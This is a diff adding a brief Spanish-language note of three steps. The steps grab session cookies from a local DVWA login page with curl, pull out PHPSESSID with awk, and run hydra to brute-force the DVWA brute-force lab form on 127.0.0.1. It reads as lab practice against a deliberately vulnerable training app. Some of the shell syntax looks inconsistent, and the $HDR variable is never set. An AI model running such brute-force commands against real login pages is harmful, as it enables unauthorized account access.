@@ -1,0 +1,5 @@
+1. curl para obtener cookies: curl -s -c ./dvwa_cookies.txt "http://127.0.0.1:8080/login.php" 
+
+2. variables: set PHPSESSID (awk '/PHPSESSID/ {print $7; exit}' ./dvwa_cookies.txt) 
+
+3. ejecución en hydra: hydra -L ./users.txt -P ./passwords.txt 127.0.0.1 -s 8080 \ http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:$HDR:F=Username and/or password incorrect" \ -t 4 -V -o ./hydra_results.txt
